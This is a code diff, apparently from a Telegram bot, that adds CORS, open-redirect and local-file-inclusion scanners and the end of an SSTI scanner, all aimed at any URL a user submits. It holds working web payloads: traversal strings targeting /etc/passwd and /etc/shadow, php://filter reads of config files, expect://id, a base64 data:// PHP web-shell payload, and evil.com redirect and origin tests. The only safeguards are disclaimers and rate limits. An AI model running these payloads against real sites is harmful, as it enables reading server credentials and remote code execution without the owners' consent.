+        data = await asyncio.to_thread(_ssti_scan_sync, url, progress_q)
+    finally:
+        prog.cancel()
+        _active_scans.pop(uid, None)
+
+    total = data["total_found"]
+    lines = [
+        f"🔥 *SSTI Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
+        f"Result: {'🔴 CRITICAL — VULNERABLE' if total > 0 else '✅ Not Detected'}",
+        f"Params tested: `{'`, `'.join(data['params_tested'][:6])}`",
+    ]
+    if data["engine_detected"]:
+        lines.append(f"🔧 Template Engine: `{data['engine_detected']}`")
+    if data["vulnerable"]:
+        lines.append(f"\n*🔴 SSTI Vulnerabilities ({total}):*")
+        for v in data["vulnerable"][:5]:
+            lines.append(f"  Param: `{v['param']}` | Engine: `{v['engine']}`")
+            lines.append(f"  Payload: `{v['payload'][:50]}`")
+            lines.append(f"  Expected output `{v['expected']}` — found in response ✅")
+        lines.append("\n*🚨 CRITICAL: SSTI can lead to Remote Code Execution (RCE)!*")
+    else:
+        lines.append("✅ No template injection detected")
+    lines.append("\n⚠️ _Authorized testing only_")
+    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
+
+
+# ══════════════════════════════════════════════════
+# 🌐 /cors — CORS Misconfiguration Scanner
+# ══════════════════════════════════════════════════
+
+def _cors_scan_sync(url: str, progress_q: list) -> dict:
+    """Test for CORS misconfigurations."""
+    results = {
+        "vulnerable": False,
+        "reflect_any": False,
+        "reflect_null": False,
+        "reflect_wildcard": False,
+        "with_credentials": False,
+        "findings": [],
+        "acao_header": "",
+        "acac_header": "",
+    }
+    session = requests.Session()
+    session.headers.update(_get_headers())
+    session.verify = False
+
+    test_origins = [
+        "https://evil.com",
+        "null",
+        f"https://evil.{urlparse(url).hostname}",
+        "https://attacker.com",
+        "https://xss.evil.com",
+    ]
+
+    progress_q.append("🌐 Testing CORS misconfigurations...")
+
+    for origin in test_origins:
+        try:
+            r = session.get(url, headers={**_get_headers(), "Origin": origin}, timeout=10)
+            acao = r.headers.get("Access-Control-Allow-Origin", "")
+            acac = r.headers.get("Access-Control-Allow-Credentials", "")
+            results["acao_header"] = acao
+            results["acac_header"] = acac
+
+            if acao == origin:
+                results["reflect_any"] = True
+                if acac.lower() == "true":
+                    results["with_credentials"] = True
+                    results["vulnerable"] = True
+                    results["findings"].append({
+                        "type": "CRITICAL — Reflected Origin + credentials",
+                        "origin_sent": origin, "acao": acao, "acac": acac,
+                        "severity": "CRITICAL"
+                    })
+                    progress_q.append(f"🔴 CRITICAL CORS! Origin `{origin}` reflected + credentials=true")
+                else:
+                    results["findings"].append({
+                        "type": "HIGH — Origin reflected (no creds)",
+                        "origin_sent": origin, "acao": acao,
+                        "severity": "HIGH"
+                    })
+                    progress_q.append(f"🟠 CORS: Origin `{origin}` reflected")
+
+            elif acao == "null" and origin == "null":
+                results["reflect_null"] = True
+                results["findings"].append({
+                    "type": "MEDIUM — null origin accepted",
+                    "origin_sent": "null", "acao": "null", "severity": "MEDIUM"
+                })
+                progress_q.append("🟡 CORS: null origin accepted")
+
+            elif acao == "*":
+                results["reflect_wildcard"] = True
+                results["findings"].append({
+                    "type": "INFO — Wildcard (*) CORS",
+                    "acao": "*", "severity": "LOW"
+                })
+        except Exception as _e:
+            logging.debug("CORS error: %s", _e)
+
+    results["vulnerable"] = len([f for f in results["findings"] if f["severity"] in ("CRITICAL","HIGH")]) > 0
+    return results
+
+async def cmd_cors(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/cors <url> — CORS misconfiguration scanner"""
+    if not await check_force_join(update, context): return
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    if not context.args:
+        await update.effective_message.reply_text(
+            "🌐 *CORS Scanner Usage:*\n`/cors https://api.example.com/data`\n\n"
+            "*Checks:*\n"
+            "  • Reflected origin attack\n  • null origin acceptance\n"
+            "  • Wildcard with credentials\n  • Subdomain takeover via CORS\n\n"
+            "⚠️ _Authorized testing only_",
+            parse_mode='Markdown'
+        )
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'): url = 'https://' + url
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
+        return
+
+    if uid in _active_scans:
+        await update.effective_message.reply_text(
+            f"⏳ *`{_active_scans[uid]}` running*", parse_mode='Markdown')
+        return
+    _active_scans[uid] = "CORS scan"
+
+    domain = urlparse(url).hostname
+    msg = await update.effective_message.reply_text(
+        f"🌐 *CORS Scan — `{domain}`*\n\n⏳ Testing origins...", parse_mode='Markdown')
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try: await msg.edit_text(f"🌐 *CORS — `{domain}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception: pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        data = await asyncio.to_thread(_cors_scan_sync, url, progress_q)
+    finally:
+        prog.cancel()
+        _active_scans.pop(uid, None)
+
+    total = len(data["findings"])
+    crit_count = len([f for f in data["findings"] if f["severity"] == "CRITICAL"])
+    lines = [
+        f"🌐 *CORS Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
+        f"Result: {'🔴 VULNERABLE' if data['vulnerable'] else ('⚠️ Issues found' if total else '✅ Secure')}",
+        f"`Access-Control-Allow-Origin`: `{data['acao_header'] or 'Not set'}`",
+        f"`Access-Control-Allow-Credentials`: `{data['acac_header'] or 'Not set'}`",
+    ]
+    if data["findings"]:
+        lines.append(f"\n*Findings ({total}):*")
+        for f in data["findings"]:
+            icon = "🔴" if f["severity"] == "CRITICAL" else ("🟠" if f["severity"] == "HIGH" else "🟡")
+            lines.append(f"  {icon} `{f['type']}`")
+            if "origin_sent" in f:
+                lines.append(f"     Origin sent: `{f['origin_sent']}`")
+        if crit_count:
+            lines.append("\n*🚨 CRITICAL: Attacker can read authenticated API responses!*")
+    else:
+        lines.append("✅ No CORS misconfigurations detected")
+    lines.append("\n⚠️ _Authorized testing only_")
+    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
+
+
+# ══════════════════════════════════════════════════
+# 🔀 /openredirect — Open Redirect Scanner
+# ══════════════════════════════════════════════════
+
+_REDIRECT_PAYLOADS = [
+    "https://evil.com",
+    "//evil.com",
+    "/\\evil.com",
+    "https://evil.com%2F@target.com",
+    "https:evil.com",
+    "/%0aLocation:https://evil.com",
+    "https://evil.com?",
+    "https://evil.com#",
+    "@evil.com",
+    "javascript:alert(1)",
+    "data:text/html,<script>alert(1)</script>",
+]
+
+_REDIRECT_PARAMS = ["url", "redirect", "redirect_url", "return", "return_url",
+                    "next", "next_url", "goto", "go", "target", "dest",
+                    "destination", "redir", "location", "continue", "back",
+                    "forward", "from", "to", "link", "out", "exit", "jump"]
+
+def _openredirect_scan_sync(url: str, progress_q: list) -> dict:
+    results = {"vulnerable": [], "total_found": 0, "params_tested": []}
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    # Use URL params if present, else try common redirect params
+    params = {}
+    if parsed.query:
+        for p in parsed.query.split("&"):
+            if "=" in p:
+                k, v = p.split("=", 1)
+                params[k] = v
+    if not params:
+        params = {p: "https://example.com" for p in _REDIRECT_PARAMS[:8]}
+        results["_no_params"] = True
+
+    results["params_tested"] = list(params.keys())
+    session = requests.Session()
+    session.headers.update(_get_headers())
+    session.verify = False
+
+    progress_q.append(f"🔀 Testing {len(params)} params with {len(_REDIRECT_PAYLOADS)} payloads...")
+
+    for param in list(params.keys())[:8]:
+        for payload in _REDIRECT_PAYLOADS:
+            try:
+                test_params = dict(params)
+                test_params[param] = payload
+                r = session.get(base_url, params=test_params, timeout=8,
+                                allow_redirects=False)
+                loc = r.headers.get("Location", "")
+                # Vulnerable if redirected to our payload domain
+                if r.status_code in (301, 302, 303, 307, 308) and \
+                   ("evil.com" in loc or loc == payload):
+                    results["vulnerable"].append({
+                        "param": param, "payload": payload,
+                        "status": r.status_code, "location": loc,
+                        "severity": "HIGH" if not payload.startswith("javascript") else "CRITICAL"
+                    })
+                    progress_q.append(f"🔀 Open Redirect! Param: `{param}` → `{loc[:50]}`")
+                    break
+            except Exception:
+                pass
+
+    results["total_found"] = len(results["vulnerable"])
+    return results
+
+async def cmd_openredirect(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/openredirect <url> — Open Redirect vulnerability scanner"""
+    if not await check_force_join(update, context): return
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    if not context.args:
+        await update.effective_message.reply_text(
+            "🔀 *Open Redirect Scanner:*\n`/openredirect https://example.com?next=http://google.com`\n\n"
+            "*Tests params:* url, redirect, return, next, goto, dest, etc.\n"
+            "⚠️ _Authorized testing only_",
+            parse_mode='Markdown'
+        )
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'): url = 'https://' + url
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
+        return
+
+    if uid in _active_scans:
+        await update.effective_message.reply_text(
+            f"⏳ *`{_active_scans[uid]}` running*", parse_mode='Markdown')
+        return
+    _active_scans[uid] = "Open Redirect scan"
+
+    domain = urlparse(url).hostname
+    msg = await update.effective_message.reply_text(
+        f"🔀 *Open Redirect Scan — `{domain}`*\n\n⏳ Testing...", parse_mode='Markdown')
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try: await msg.edit_text(f"🔀 *Redirect — `{domain}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception: pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        data = await asyncio.to_thread(_openredirect_scan_sync, url, progress_q)
+    finally:
+        prog.cancel()
+        _active_scans.pop(uid, None)
+
+    total = data["total_found"]
+    lines = [
+        f"🔀 *Open Redirect Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
+        f"Result: {'🟠 VULNERABLE' if total else '✅ Not Detected'}",
+        f"Params tested: `{'`, `'.join(data['params_tested'][:8])}`",
+    ]
+    if data["vulnerable"]:
+        lines.append(f"\n*🟠 Open Redirects ({total}):*")
+        for v in data["vulnerable"][:5]:
+            lines.append(f"  Param: `{v['param']}` | HTTP {v['status']}")
+            lines.append(f"  Location: `{v['location'][:60]}`")
+    else:
+        lines.append("✅ No open redirects detected")
+    lines.append("\n⚠️ _Authorized testing only_")
+    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
+
+
+# ══════════════════════════════════════════════════
+# 📂 /lfi — Local File Inclusion Scanner
+# ══════════════════════════════════════════════════
+
+_LFI_PAYLOADS = [
+    "../../../etc/passwd",
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "..%2F..%2F..%2Fetc%2Fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%252f..%252f..%252fetc%252fpasswd",
+    "/etc/passwd",
+    "/etc/shadow",
+    "/etc/hosts",
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "C:\\Windows\\win.ini",
+    "C:\\Windows\\System32\\drivers\\etc\\hosts",
+    "..\\..\\..\\.\\Windows\\win.ini",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=convert.base64-encode/resource=../config.php",
+    "php://input",
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+    "expect://id",
+]
+
+_LFI_INDICATORS = [
+    r"root:x:0:0:",         # /etc/passwd
+    r"\[fonts\]",           # win.ini
+    r"localhost",           # /etc/hosts
+    r"HTTP_USER_AGENT",     # environ
+    r"base64_encode",       # php filter
+    r"DOCUMENT_ROOT",       # environ
+    r"PHP_VERSION",         # environ
+]
+
+def _lfi_scan_sync(url: str, progress_q: list) -> dict:
+    results = {"vulnerable": [], "total_found": 0, "params_tested": []}
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    params = {}
+    if parsed.query:
+        for p in parsed.query.split("&"):
+            if "=" in p:
+                k, v = p.split("=", 1)
+                params[k] = v
+    if not params:
+        lfi_common = ["file", "page", "path", "include", "load", "read",
+                      "template", "view", "doc", "document", "lang", "language"]
+        params = {p: "index" for p in lfi_common[:6]}
+        results["_no_params"] = True
+
+    results["params_tested"] = list(params.keys())
+    session = requests.Session()
+    session.headers.update(_get_headers())
+    session.verify = False
+
+    progress_q.append(f"📂 Testing {len(params)} params × {len(_LFI_PAYLOADS)} LFI payloads...")
+
+    for param in list(params.keys())[:5]:
+        for payload in _LFI_PAYLOADS:
+            try:
+                test_params = dict(params)
+                test_params[param] = payload
+                r = session.get(base_url, params=test_params, timeout=8)
+                for indicator in _LFI_INDICATORS:
+                    if re.search(indicator, r.text, re.I):
+                        results["vulnerable"].append({
+                            "param": param, "payload": payload,
+                            "indicator": indicator,
+                            "severity": "CRITICAL",
+                            "snippet": r.text[:200]
+                        })
+                        progress_q.append(f"🔴 LFI! Param: `{param}` | File indicator found!")
+                        break
+                if results["vulnerable"] and results["vulnerable"][-1]["param"] == param:
+                    break
+            except Exception:
+                pass
+
+    results["total_found"] = len(results["vulnerable"])
+    return results
+
+async def cmd_lfi(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/lfi <url> — Local File Inclusion scanner"""
+    if not await check_force_join(update, context): return
+    uid = update.effective_user.id
+    allowed, wait = check_rate_limit(uid)
+    if not allowed:
+        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
+        return
+
+    if not context.args:
+        await update.effective_message.reply_text(
+            "📂 *LFI Scanner Usage:*\n`/lfi https://example.com/page?file=home`\n\n"
+            "*Tests:*\n"
+            "  • Path traversal (`../../../etc/passwd`)\n"
+            "  • URL encoding bypass\n  • Double encoding\n"
+            "  • PHP wrapper (php://filter)\n"
+            "  • Windows paths (win.ini)\n\n"
+            "⚠️ _Authorized testing only_",
+            parse_mode='Markdown'
+        )
+        return
+
+    url = context.args[0].strip()
+    if not url.startswith('http'): url = 'https://' + url
+    safe_ok, reason = is_safe_url(url)
+    if not safe_ok:
+        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
+        return
+
+    if uid in _active_scans:
+        await update.effective_message.reply_text(
+            f"⏳ *`{_active_scans[uid]}` running*", parse_mode='Markdown')
+        return
+    _active_scans[uid] = "LFI scan"
+
+    domain = urlparse(url).hostname
+    msg = await update.effective_message.reply_text(
+        f"📂 *LFI Scan — `{domain}`*\n\n⏳ Testing file inclusion...", parse_mode='Markdown')
+    progress_q = []
+
+    async def _prog():
+        while True:
+            await asyncio.sleep(2)
+            if progress_q:
+                txt = progress_q[-1]; progress_q.clear()
+                try: await msg.edit_text(f"📂 *LFI — `{domain}`*\n\n{txt}", parse_mode='Markdown')
+                except Exception: pass
+
+    prog = asyncio.create_task(_prog())
+    try:
+        data = await asyncio.to_thread(_lfi_scan_sync, url, progress_q)
+    finally:
+        prog.cancel()
+        _active_scans.pop(uid, None)
+
+    total = data["total_found"]
+    lines = [
+        f"📂 *LFI Scan — `{domain}`*", "━━━━━━━━━━━━━━━━━━━━",
+        f"Result: {'🔴 CRITICAL — VULNERABLE' if total else '✅ Not Detected'}",
+        f"Params tested: `{'`, `'.join(data['params_tested'][:6])}`",
+    ]
+    if data["vulnerable"]:
+        lines.append(f"\n*🔴 LFI Vulnerabilities ({total}):*")
+        for v in data["vulnerable"][:4]:
+            lines.append(f"  Param: `{v['param']}`")
+            lines.append(f"  Payload: `{v['payload'][:50]}`")
+            lines.append(f"  Indicator: `{v['indicator']}`")
+            if v.get("snippet"):
+                snippet = v["snippet"][:80].replace("`", "'")
+                lines.append(f"  Preview: `{snippet}...`")
+        lines.append("\n*🚨 CRITICAL: LFI can expose server files, configs, credentials!*")
+    else:
+        lines.append("✅ No LFI vulnerabilities detected")
+    lines.append("\n⚠️ _Authorized testing only_")
+    await msg.edit_text("\n".join(lines), parse_mode='Markdown')
 
 
 if __name__ == '__main__':
